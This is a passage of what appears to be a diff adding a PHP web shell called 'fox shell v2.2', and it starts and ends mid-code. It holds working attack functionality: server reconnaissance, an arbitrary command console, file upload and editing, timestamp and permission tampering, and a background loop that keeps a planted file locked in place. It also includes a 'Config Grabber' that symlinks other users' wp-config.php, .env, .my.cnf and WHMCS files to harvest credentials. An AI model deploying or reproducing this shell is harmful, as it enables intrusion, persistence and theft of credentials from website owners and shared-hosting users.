]';$total_bytes=@disk_total_space('.');$free_bytes=@disk_free_space('.');$info['hdd_total']=$total_bytes?number_format($total_bytes/1024/1024/1024,2):'0';$info['hdd_free']=$free_bytes?number_format($free_bytes/1024/1024/1024,2):'0';$info['hdd_percent']=($total_bytes&&$free_bytes)?round(($free_bytes/$total_bytes)*100):0;$tools=array('gcc','cc','ld','make','php','perl','python','tar','gzip','nc','locate');$available_tools=array();foreach($tools as $tool){if(@shell_exec("which $tool 2>/dev/null")){$available_tools[]=$tool;}}$info['tools']=implode('',$available_tools);$downloaders=array();if(@shell_exec("which wget 2>/dev/null"))$downloaders[]='wget';if(@shell_exec("which curl 2>/dev/null"))$downloaders[]='curl';$info['downloaders']=implode('',$downloaders);$disabled=@ini_get('disable_functions');$info['disabled_functions']=empty($disabled)?'All Functions Accessible':$disabled;$info['curl']=extension_loaded('curl')?'ON':'OFF';$info['ssh2']=extension_loaded('ssh2')?'ON':'OFF';$info['magic_quotes']=(function_exists('get_magic_quotes_gpc')&&get_magic_quotes_gpc())?'ON':'OFF';$info['mysql']=extension_loaded('mysql')?'ON':'OFF';$info['mssql']=extension_loaded('mssql')?'ON':'OFF';$info['postgresql']=extension_loaded('pgsql')?'ON':'OFF';$info['oracle']=extension_loaded('oci8')?'ON':'OFF';$info['cgi']=(php_sapi_name()=='cgi-fcgi')?'ON':'OFF';$info['open_basedir']=@ini_get('open_basedir')?:'NONE';$info['safe_mode_exec_dir']=@ini_get('safe_mode_exec_dir')?:'NONE';$info['safe_mode_include_dir']=@ini_get('safe_mode_include_dir')?:'NONE';return $info;}$sysinfo=getSystemInfo();echo '<div class="header">
+    <div class="header-content">
+        <div class="system-info">
+            <div><strong>Uname:</strong> '.htmlspecialchars($sysinfo['uname']).'</div>
+            <div><strong>User:</strong> '.$sysinfo['user_id'].' [ '.$sysinfo['user_name'].' ] <strong>Group:</strong> '.$sysinfo['group_id'].' [ '.$sysinfo['group_name'].' ]</div>
+            <div><strong>PHP:</strong> '.$sysinfo['php_version'].' <strong>Safe Mode:</strong> '.$sysinfo['safe_mode'].'</div>
+            <div><strong>ServerIP:</strong> '.$sysinfo['server_ip'].' <strong>Your IP:</strong> '.$sysinfo['client_ip'].'</div>
+            <div><strong>DateTime:</strong> '.$sysinfo['datetime'].'</div>
+            <div><strong>Domains:</strong> '.$sysinfo['domains'].'</div>
+            <div><strong>HDD:</strong> Total:'.$sysinfo['hdd_total'].' GB Free:'.$sysinfo['hdd_free'].' GB ['.$sysinfo['hdd_percent'].'%]</div>
+            <div><strong>Useful:</strong> '.$sysinfo['tools'].'</div>
+            <div><strong>Downloader:</strong> '.$sysinfo['downloaders'].'</div>
+            <div><strong>Disable Functions:</strong> '.(strlen($sysinfo['disabled_functions'])>50?substr($sysinfo['disabled_functions'],0,50).'...':$sysinfo['disabled_functions']).'</div>
+            <div><strong>CURL:</strong> '.$sysinfo['curl'].' | <strong>SSH2:</strong> '.$sysinfo['ssh2'].' | <strong>Magic Quotes:</strong> '.$sysinfo['magic_quotes'].' | <strong>MySQL:</strong> '.$sysinfo['mysql'].' | <strong>MSSQL:</strong> '.$sysinfo['mssql'].' | <strong>PostgreSQL:</strong> '.$sysinfo['postgresql'].' | <strong>Oracle:</strong> '.$sysinfo['oracle'].' | <strong>CGI:</strong> '.$sysinfo['cgi'].'</div>
+            <div style="color: #94d3ff; font-style: italic;">Fox </div>
+            <div><strong>Open_basedir:</strong> '.$sysinfo['open_basedir'].' | <strong>Safe_mode_exec_dir:</strong> '.$sysinfo['safe_mode_exec_dir'].' | <strong>Safe_mode_include_dir:</strong> '.$sysinfo['safe_mode_include_dir'].'</div>
+        </div>
+        <div class="header-logo">
+            <a href="'.$_SERVER['SCRIPT_NAME'].'">
+                <img src="https://ampnyapunyaku.top/tools/fox/fox.png" alt="Logo">
+            </a>
+        </div>
+    </div>
+    <div class="header-nav">
+        <div class="nav-buttons-center">
+            <div class="btn-group" role="group">
+                <button type="button" onclick="location.href=\''.$_SERVER['SCRIPT_NAME'].'\'" class="btn btn-outline-light">
+                    <i class="fa fa-home"></i> Home
+                </button>
+                <button type="button" onclick="location.href=\'?path=/\'" class="btn btn-outline-warning">
+                    <i class="fa fa-linux"></i> Root
+                </button>
+                <div class="btn-group" role="group">
+                    <button type="button" class="btn btn-outline-info dropdown-toggle" data-bs-toggle="dropdown">
+                        <i class="fa fa-folder-open"></i> Quick Nav
+                    </button>
+                    <ul class="dropdown-menu">';$quickPaths=getQuickNavPaths();foreach($quickPaths as $path=>$label){echo '<li><a class="dropdown-item" href="?path='.urlencode($path).'"><i class="fa fa-folder"></i> '.$label.'</a></li>';}echo '      </ul>
+                </div>
+                <button type="button" onclick="openModal(\'console\')" class="btn btn-outline-light">
+                    <i class="fa fa-terminal"></i> Console
+                </button>
+                <button type="button" onclick="location.href=\'?path='.$serlok.'&'.net("upload").'=foxx\'" class="btn btn-outline-light">
+                    <i class="fa fa-upload"></i> Upload
+                </button>
+                <button type="button" onclick="openModal(\'info\')" class="btn btn-outline-light">
+                    <i class="fa fa-info-circle"></i> Information
+                </button>
+                <button type="button" onclick="location.href=\'?path='.$serlok.'&'.net("buatfile").'=foxx\'" class="btn btn-outline-light">
+                    <i class="fa fa-file-plus"></i> Create File
+                </button>
+                <button type="button" onclick="location.href=\'?path='.$serlok.'&'.net("buatfolder").'=foxx\'" class="btn btn-outline-light">
+                    <i class="fa fa-folder-plus"></i> Create Folder
+                </button>
+                <button type="button" onclick="openModal(\'tools\')" class="btn btn-outline-light">
+                    <i class="fa fa-wrench"></i> Tools
+                </button>
+                <button type="button" onclick="location.href=\'?logout\'" class="btn btn-outline-danger">
+                    <i class="fa fa-sign-out"></i> Logout
+                </button>
+
+            </div>
+        </div>
+    </div>
+</div>'; ?>
+<?php echo '<div style="padding: 0 20px;"><table class="directory-listing-table"><td><i class="fa fa-folder" style="color:#F19013;"></i> <b>:</b> ';foreach($serloks as $id=>$lok){if($lok==''&&$id==0){echo '<a href="?path=/">/&nbsp;</a></center>';continue;}if($lok=='')continue;echo '<a href="?path=';for($i=0;$i<=$id;$i++){echo $serloks[$i];if($i!=$id)echo "/";}echo '">'.$lok.'</a>&nbsp;/&nbsp;';}echo '</td></thead></table></div><br>';if(isset($_GET['viewfile'])){$files=basename($_GET['viewfile']);$filepath=$_GET['viewfile'];echo"<table class='directory-listing-table'><td><center>Filename : <font color='orange'>$files</font>";echo '<form method="POST" action="?pilihan&path='.$serlok.'">';echo"<table width='20%' border='0' cellpadding='0' cellspacing='0' align='center'><td>
+    <a href='?path=$serlok' class='btn btn-outline-light'><i class='fa fa-arrow-left'></i> back</a>";echo gazz($files);echo "<button type='button' style='float:right;' class='btn btn-outline-light' onclick='myFunction()'><i class='fa fa-copy'></i> Copy</button></div><br><br>";echo"<input type='hidden' name='type' value='file'>
+    <input type='hidden' name='name' value='$files'>
+    <input type='hidden' name='path' value='$serlok/$files'>";echo "<textarea readonly='' style='width: 100%; max-width: 100%; box-sizing: border-box;' rows=30 id='myInput'>".htmlspecialchars(file_get_contents($filepath))."</textarea></td></table></table><br>";exit();}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="hapus"){if(is_dir($_POST['path'])){xrmdir($_POST['path']);if(file_exists($_POST['path'])){echo '<table class="directory-listing-table" style="border-color:red;"><td><center><font color="red"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Failed to delete Directory</font>';}else{echo '<table class="directory-listing-table" style="border-color:lime;"><td><center><font color="lime"><i class="fa fa-trash"></i> Folder removed</font>';}echo '<br><br><a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali</a>';echo '</center></td></table>';}elseif(is_file($_POST['path'])){@unlink($_POST['path']);if(file_exists($_POST['path'])){echo "<table class='directory-listing-table' style='border-color:red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Delete File</font></center></td></table>";}else{echo "<table class='directory-listing-table' style='border-color:lime;'><td><center><i class='fa fa-trash'></i> File removed <font color='lime'>".basename($_POST['path'])."</font>";}echo '<br><br><a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali</a>';echo '</center></td></table>';}exit();}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="gantinama"){if(isset($_POST['gantin'])){$namabaru=$_GET['path']."/".$_POST['newname'];if(@rename($_POST['path'],$namabaru)===true){echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><i class='fa fa-check-circle'></i> ✅ Rename Success!</font></center></td></table>";echo "<table class='directory-listing-table'><td><center>";if($_POST['type']=="file"){echo "File <font color='aqua'>".basename($_POST['path'])."</font> berhasil diubah menjadi <font color='lime'>".basename($_POST['newname'])."</font>";}else{echo "Folder <font color='aqua'>".basename($_POST['path'])."</font> berhasil diubah menjadi <font color='lime'>".basename($_POST['newname'])."</font>";}echo '<br><br><a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali</a>';echo '</center></td></table>';echo '<script>
+            setTimeout(function() {
+                closeModal("rename");
+                window.location.href = "?path='.dirname($_POST['path']).'";
+            }, 2000);
+            </script>';}else{echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> ❌ FAILED TO CHANGE NAME</font></center></td></table>";echo '<script>
+            setTimeout(function() {
+                closeModal("rename");
+                window.location.href = "?path='.dirname($_POST['path']).'";
+            }, 3000);
+            </script>';}}exit();}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="edit"){if(isset($_POST['gasedit'])){$edit=file_put_contents($_POST['path'],$_POST['src']);if($edit==true){echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><i class='fa fa-check-circle'></i> ✅ File berhasil disimpan!</font></center></td></table>";echo "<table class='directory-listing-table'><td><center>File <font color='aqua'>".basename($_POST['path'])."</font> telah diupdate<br><br>";echo '<a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali ke File Manager</a>';echo '</center></td></table>';echo '<script>
+        setTimeout(function() {
+            closeModal("edit");
+            window.location.href = "?path='.dirname($_POST['path']).'";
+        }, 2000);
+        </script>';}else{echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> ❌ Gagal menyimpan file/Permission Denied</font></center></td></table>";echo '<script>
+        setTimeout(function() {
+            closeModal("edit");
+            window.location.href = "?path='.dirname($_POST['path']).'";
+            }, 3000);
+            </script>';}exit();}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="chdatef"){if(isset($_POST['change'])){$tanggal=strtotime($_POST['tanggal']);if(@touch($_POST['path'],$tanggal)==true){echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><i class='fa fa-check-circle'></i> ✅ Tanggal berhasil diubah!</font></center></td></table>";echo "<table class='directory-listing-table'><td><center>Folder <font color='aqua'>".basename($_POST['path'])."</font> tanggal: <font color='lime'>".date('Y-m-d H:i:s',$tanggal)."</font><br><br>";echo '<a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali</a>';echo '</center></td></table>';echo '<script>
+  setTimeout(function() {
+      closeModal("chdate");
+      window.location.href = "?path='.dirname($_POST['path']).'";
+    }, 2000);
+    </script>';}else{echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> ❌ Gagal mengubah tanggal!</font></center></td></table>";echo '<script>
+    setTimeout(function() {
+          closeModal("chdate");
+                window.location.href = "?path='.dirname($_POST['path']).'";
+            }, 3000);
+            </script>';}exit();}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="chdate"){if(isset($_POST['change'])){$tanggal=strtotime($_POST['tanggal']);if(@touch($_POST['path'],$tanggal)==true){echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><i class='fa fa-check-circle'></i> ✅ Tanggal berhasil diubah!</font></center></td></table>";echo "<table class='directory-listing-table'><td><center>File <font color='aqua'>".basename($_POST['path'])."</font> tanggal: <font color='lime'>".date('Y-m-d H:i:s',$tanggal)."</font><br><br>";echo '<a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali</a>';echo '</center></td></table>';echo '<script>
+  setTimeout(function() {
+      closeModal("chdate");
+      window.location.href = "?path='.dirname($_POST['path']).'";
+    }, 2000);
+    </script>';}else{echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> ❌ Gagal mengubah tanggal!</font></center></td></table>";echo '<script>
+    setTimeout(function() {
+          closeModal("chdate");
+                window.location.href = "?path='.dirname($_POST['path']).'";
+            }, 3000);
+            </script>';}exit();}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="chmodf"){if(isset($_POST['ganti'])){$foxx=@chmod($_POST['path'],octdec($_POST['mod1']));if($foxx==true){echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><i class='fa fa-check-circle'></i> ✅ Permission berhasil diubah!</font></center></td></table>";echo "<table class='directory-listing-table'><td><center>Folder <font color='aqua'>".basename($_POST['path'])."</font> permission: <font color='lime'>".$_POST['mod1']."</font><br><br>";echo '<a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali</a>';echo '</center></td></table>';echo '<script>
+        setTimeout(function() {
+            closeModal("chmod");
+            window.location.href = "?path='.dirname($_POST['path']).'";
+        }, 2000);
+      </script>';}else{echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> ❌ Gagal mengubah permission!</font></center></td></table>";echo '<script>
+setTimeout(function() {
+        closeModal("chmod");
+          window.location.href = "?path='.dirname($_POST['path']).'";
+            }, 3000);
+            </script>';}exit();}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="chmod"){if(isset($_POST['ganti'])){$foxx=@chmod($_POST['path'],octdec($_POST['mod1']));if($foxx==true){echo "<table class='directory-listing-table' style='border: 1px solid lime;'><td><center><font color='lime'><i class='fa fa-check-circle'></i> ✅ Permission berhasil diubah!</font></center></td></table>";echo "<table class='directory-listing-table'><td><center>File <font color='aqua'>".basename($_POST['path'])."</font> permission: <font color='lime'>".$_POST['mod1']."</font><br><br>";echo '<a href="?path='.dirname($_POST['path']).'" class="btn btn-outline-light"><i class="fa fa-arrow-left"></i> Kembali</a>';echo '</center></td></table>';echo '<script>
+        setTimeout(function() {
+            closeModal("chmod");
+            window.location.href = "?path='.dirname($_POST['path']).'";
+        }, 2000);
+      </script>';}else{echo "<table class='directory-listing-table' style='border: 1px solid red;'><td><center><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> ❌ Gagal mengubah permission!</font></center></td></table>";echo '<script>
+setTimeout(function() {
+        closeModal("chmod");
+          window.location.href = "?path='.dirname($_POST['path']).'";
+            }, 3000);
+            </script>';}exit();}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="unzip"){$zip_file=$_POST['path'];$extract_dir=dirname($zip_file);if(!file_exists($zip_file)){echo"<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> File not found: $zip_file</center></font></td></table>";exit();}unzip($zip_file,$extract_dir);}elseif($_REQUEST[net('upload')]=="foxx"){echo "<table class='directory-listing-table'><td><center>\n    <form method='POST' enctype='multipart/form-data' id='upload'><h5><i class='fa fa-upload'></i> UPLOAD FILES<h5>\n    <div class='input-group' style='width:360px;'>\n    <input type='file' name='foxfile' id='fox' style='background-color: grey;' class='form-control' name='uplod'>\n    <input type='submit' class='btn btn-outline-light' for='inputGroupFile02' name='uplod' value='Upload'></div>\n              </form></center></td></table>";if(isset($_POST['uplod'])){if($_POST['dirnya']=="2"){$serlok=$_SERVER['DOCUMENT_ROOT'];}if(empty($_FILES['foxfile']['name'])){echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> File not selected</center></font>";}else{$data=@file_put_contents($serlok."/".$_FILES['foxfile']['name'],@file_get_contents($_FILES['foxfile']['tmp_name']));if(file_exists($serlok."/".$_FILES['foxfile']['name'])){$fl=$serlok."/".$_FILES['foxfile']['name'];echo "<br><table class='directory-listing-table' style='border-color:lime;'><td>\n                    Uploaded => <font color='lime'><i>".$_FILES['foxfile']['name']."</i></font><br>";if(strpos($serlok,$_SERVER['DOCUMENT_ROOT'])!==false){$lwb=str_replace($_SERVER['DOCUMENT_ROOT'],$web."/",$fl);echo "Link : <a href='".$lwb."' target='_blank'><font color='lime'>Click here</font></a></td></table><br>";}echo "<br>";}else{echo "<br><table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center>There was an error uploading your file.</font></td></table>";}}}exit();}elseif($_GET[net('cmd')]=="foxx"){echo "<table class='directory-listing-table'><td>";echo '<br><form method="post"><center>
+    <div class="input-group" style="width:600px;">
+    <span class="input-group-text mb-1">Command :</span>
+     <input type="text" class="form-control" name="komen" id="comandnya" value="'.$_POST['komen'].'" placeholder="uname -a" required>
+    <button type="submit" name="comandeks" value="execute" class="btn btn-outline-light mb-1">>></button></div></form><br><center>';if(isset($_POST['comandeks'])){ekse($_POST['komen'],$serlok);}echo "</center></td></table><br></center>";exit();}elseif($_REQUEST[net('about')]=="foxx"){echo "<table class='directory-listing-table'><thead><td><div style='font-family: Bungee Outline;font-size:24px;'>\n    <img class='crot' src='https://i.pinimg.com/564x/84/0e/4c/840e4c57fab2ba6279b377ae8dc333d3.jpg'/> Priv shell uwu edition</div><hr>\n    <br> - fox shell v2.2 <br> - Created by fox</td></thead></table>";exit();}elseif($_REQUEST[net('lokfile')]=="foxx"){echo "<table class='directory-listing-table'><td>\n    <h5><i class='fa fa-lock' style='color:#1A9DD2;'></i> Lock file<font class='fox-text' style='font-size:12px;'><i> Linux</i></font></h5><hr style='color:#04FBFF;'>\n    <center><form method='post'>\n    <div class='input-group' style='width:300px;'>\n    <span class='input-group-text mb-2'>Filename :</span>\n    <input type='text' name='pile' class='form-control mb-2' placeholder='file.php'/></div><br>\n    <button type='sumbit' class='btn btn-outline-light' style='width:120px;' name='submit'>Submit</button>&nbsp;\n    <a href='?path=".$serlok."&".net('tool')."=foxx' class='btn btn-outline-light' style='width:120px;'>Back</a></form><br></td></table>";if(isset($_POST['submit'])){if(empty($_POST['pile'])){echo "<br><table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center>The File field is required</center></font></td></table>";}else{$filez=$_POST['pile'];$tempe="/tmp";if(file_exists($tempe.'/'.md5($serlok.$filez.'-xfox').fox_ex($filez).'xhand.Lock')&&file_exists($tempe.'/'.fox_ex($filez).'-xfoxx')){cmd('rm -rf '.$tempe.'/'.md5($serlok.$filez.'-xfoxx').fox_ex($filez).'xfox.Lock',$serlok);cmd('rm -rf '.$tempe.'/'.md5($serlok.$filez.'-xfox').fox_ex($filez).'xhand.Lock',$serlok);}cmd("cp $filez ".$tempe."/".md5($serlok.$filez.'-xfoxx').fox_ex($filez).'xfox.Lock',$serlok);@chmod($filez,0444);$content='<?php
+    $tmp = "/tmp";
+    $fileperm = fox_perm("'.$filez.'");
+    fox_cmd("chmod 444 '.$filez.'");
+    while (True) {
+        if (!file_exists("'.$filez.'")) {
+            $var = base64_encode(file_get_contents($tmp . "/'.md5($serlok.$filez.'-xfoxx').fox_ex($filez).'xfox.Lock"));
+            FiLe_pUt_ConTentS("'.$filez.'", base64_decode($var));
+        }
+        if ($fileperm != "0444"){
+            fox_cmd("chmod 444 '.$filez.'");
+        }
+    }
+    function fox_cmd($value)
+    {
+        if (function_exists("system")) {
+            sYsTem($value);
+        } else if (function_exists("shell_exec")) {
+            return ShEll_eXeC($value);
+        } else if (function_exists("exec")) {
+            return ExEc($value);
+        } else if (function_exists("passthru")) {
+            return pAsSThRu($value);
+        }
+    }
+    function fox_perm($filez){
+        return substr(sprintf("%o", fileperms($filez)), -4);
+    }';$content=file_put_contents($tempe."/".md5($serlok.$filez.'-xfox').fox_ex($filez).'xhand.Lock',$content);if($content){echo"<table class='directory-listing-table' style='border-color:lime;'><td>Locked => <font color='lime'>$filez</font></td></table>";cmd('php '.$tempe.'/'.md5($serlok.$filez.'-xfox').fox_ex($filez).'"xhand.Lock" > /dev/null 2>/dev/null &',$serlok);}else{echo"<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Can't lock $filez</font></td></table>";}}}exit();}elseif($_GET[net('resetcp')]=="foxx"){echo "<table class='directory-listing-table'><td>\n<h5>Coming Soon</h5><hr></td></table><br>";exit();}elseif($_GET[net('hashiden')]=="foxx"){echo "<table class='directory-listing-table'><td>\n<h5>Hash Identifier</h5>Identify and detect unknown hashes using this tool.<hr>\n<form method='POST'>\n<div class='input-group' style='width:650px;'>\n<span class='input-group-text mb-2'>Your hash :</span>\n<input type='text' name='hash' class='form-control mb-2' placeholder='write here'></div><br>\n<button type='submit' name='submit' class='btn btn-outline-light'>Submit & identify</button>\n&nbsp;<a href='?path=".$serlok."&".net('tool')."=foxx' class='btn btn-outline-light'>Back</a></form></td></table><br>";if(isset($_POST['submit'])){if(empty($_POST['hash'])){echo "<table class='directory-listing-table' style='border-color:orange;'><td><font color='orange'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> The Hashes field is required</font></center></td></table>";}else{function identify($hash){$algorithms=['<font color="lime">MD5'=>'/^[a-f0-9]{32}$/i','<font color="lime">SHA1'=>'/^[a-f0-9]{40}$/i','<font color="lime">SHA224, Keccak-224'=>'/^[a-f0-9]{56}$/i','<font color="lime">SHA256'=>'/^[a-f0-9]{64}$/i','<font color="lime">SHA512'=>'/^[a-f0-9]{128}$/i','<font color="lime">Bcrypt, Blowfish(Unix)'=>'/^\$2y\$[0-9]{2}\$[A-Za-z0-9\.\/]{53}$/','<font color="lime">Argon2i'=>'/^\$argon2i\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\/+]{43,}\$[A-Za-z0-9\/+]{43,}$/','<font color="lime">Argon2id'=>'/^\$argon2id\$v=\d+\$m=\d+,t=\d+,p=\d+\$[A-Za-z0-9\/+]{43,}\$[A-Za-z0-9\/+]{43,}$/'];foreach($algorithms as $name=>$pattern){if(preg_match($pattern,$hash)){return $name;}}return '<font color="red">Could not identify / Tidak dapat mengidentifikasi</font>';}$hashes=[$_POST['hash']];echo "<table class='directory-listing-table'><td>";foreach($hashes as $hash){echo"
+    Hash : <font color='lime'>$hash
+</font>";echo "<br> Algorithms : ".identify($hash)."\n\n</font></td></table>";}}}exit();}elseif($_GET[net('grab_config')]=="foxx"){@ini_set('max_execution_time',0);@ini_set('display_errors',0);@ini_set('file_uploads',1);echo '<table class="directory-listing-table"><thead><td>
+<center>Config Grabber<br><br><form method="POST"><textarea cols="100" name="passwd"  rows="25">';$uSr=file("/etc/passwd");foreach($uSr as $usrr){$str=explode(":",$usrr);echo $str[0]."\n";}echo'</textarea><br>
+<input type="hidden" class="input" name="folfig" value="foxcfg"/><br>
+<select class="form-select form-select-sm" aria-label=".form-select-lg example" style="width:150px;">
+<option>select menu</option>
+<option title="type txt" value=".txt">.txt</option>
+<option title="type php" value=".php">.php</option>
+<option title="type shtml" value=".shtml">.shtml</option>
+<option title="type ini" value=".ini">.ini</option>
+<option title="type html" value=".html">.html</option></select><br>
+<input name="conf" style="width:100px;" class="btn btn-outline-light" value="submit" type="submit">
+</td></thead></table></form></center><br>';}if(isset($_POST['conf'])){$v="var";$folfig=$_POST['folfig'];$type=$_POST['type'];@mkdir($folfig,0755);@chdir($folfig);$htaccess="\nOptions Indexes FollowSymLinks\n\nDirectoryIndex .my.cnf\n\nAddType txt .php\n\nAddType txt .my.cnf\n\nAddType txt .accesshash\n\nAddHandler txt .php\n\nAddHandler txt .cnf\n\nAddHandler txt .accesshash\n";file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=explode("\n",$_POST["passwd"]);foreach($passwd as $pwd){$user=trim($pwd);@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vBulletin4.txt');@symlink('/home/'.$user.'/public_html/config.php',$user.'-Phpbb1.txt');@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wp1.txt');@symlink('/home/'.$user.'/htdocs/wp-config.php',$user.'-Wp-htdocs.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wp2.txt');@symlink('/home/'.$user.'/public_html/web/wp-config.php',$user.'-Wp3.txt');@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-WpHm1.txt');@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-WpHm2.txt');@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-WpHm3.txt');@symlink('/var/www/html/wp-config.php',$v.'-wp1.txt');@symlink('/home/'.$user.'/public_html/.env',$user.'-Laravel1.txt');@symlink('/home/'.$user.'/public_html/web/.env',$user.'-Laravel2.txt');@symlink('/home/'.$user.'/public_html/public/.env',$user.'-Laravel3.txt');@symlink('/var/www/html/.env',$v.'-LaravelV.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla1.txt');@symlink('/home/'.$user.'/public_html/html/configuration.php',$user.'-Joomla2.txt');@symlink('/home/'.$user.'/public_html/web/configuration.php',$user.'-Joomla3.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-Whm1.txt');@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-Whm2.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-Whm3.txt');@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-Whm4.txt');@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-Whm5.txt');@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-Whm6.txt');@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-Whm7.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-Whm8.txt');@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-Whm9.txt');@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-Magento.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter.txt');@symlink('/home/'.$user.'/public_html/web/application/config/database.php',$user.'-CodeIgniterH.txt');@symlink('/home1/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter1.txt');@symlink('/home2/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter2.txt');@symlink('/home3/'.$user.'/public_html/application/config/database.php',$user.'-CodeIgniter3.txt');@symlink('/home/'.$user.'/.my.cnf',$user.'-cpanel.txt');@symlink('/home/'.$user.'/.accesshash',$user.'-whm.txt');@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-opencart.txt');@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-mangento.txt');echo '<table class="directory-listing-table"><thead><td><center>Done => <a href='.$folfig.' target="_blank" class="button">Click Here</a></center></td></thead></table><br>';}exit();}elseif($_REQUEST[net('scanshell')]=="foxx"){echo"<center><table class='directory-listing-table'><td>
+    <form method='post'>
+    <h5><i class='fa-solid fa-newspaper'></i> Backdoors Scanning</font></h5><hr>
+    *note : Jika resultnya kosong berarti tidak ditemukan/ekstensi nya di isi dengan benar
+    <div class='input-group mb-2' style='width:350px;'>
+    <span class='input-group-text mb-1'>Extension :</span>
+    <input type='text' class='form-control' name='ext' placeholder='ex : php, phar, shtml, phtml'></div>
+    <div class='input-group mb-2' style='width:550px;'>
+    <span class='input-group-text mb-1'>Directory :</span>
+    <input type='text' class='form-control' name='peth' value='$serlok'></div>
+    <button type='submit' class='btn btn-outline-light' name='submit' style='width:120px;'>Submit</button>&nbsp;
+    <a href='?path=".$serlok."&".net('tool')."=foxx' class='btn btn-outline-light' style='width:120px;'>Back</a>\n    </form></td></table><br>";if(isset($_POST['submit'])){function scan_directory($dir){$ext=$_POST['ext'];$rdi=new RecursiveDirectoryIterator($dir);echo "<table class='directory-listing-table'><td>";foreach(new RecursiveIteratorIterator($rdi)as $filename=>$file){if(pathinfo($filename,PATHINFO_EXTENSION)==$ext){$content=file_get_contents($filename);if(preg_match('/(eval|base64_decode|str_rot13|mass_deface|addrdp|@exec|@passthru|@chmod|#exec|deface|command|{IFS}|shell_exec|SERVER_SOFTWARE|wget|@get_current_user|@getmygid|htmlspecialchars_decode|B374k|@getmygid|hacked|exe_root|xploit|Disable_Function|backdoor|backconnect|gecko-select|php_uname|Alfa-Team|ALFA_DATA|MARIJUANA|blackeagleteam|IndoSec|getHostByName|alfashell|php-obfuscator|gacor|slot-gacor|slot88|featureShell|move_upload_file|upload)\s*\(/i',$content)){echo"<pre>Found : <font color='lime'>$filename</font> => <font color='orange'>Detected</font> <a href='?viewfile=$filename&path=".$_GET['path']."/$rdi' target='_blank'><i>view</i></a></pre>";}}}}$cek=$_POST['peth'];if($cek){scan_directory($cek);echo "<font color='aqua'>Scan Completed..!!</font></td></table><br>";}}exit();}elseif($_REQUEST[net('massdef')]=="foxx"){function 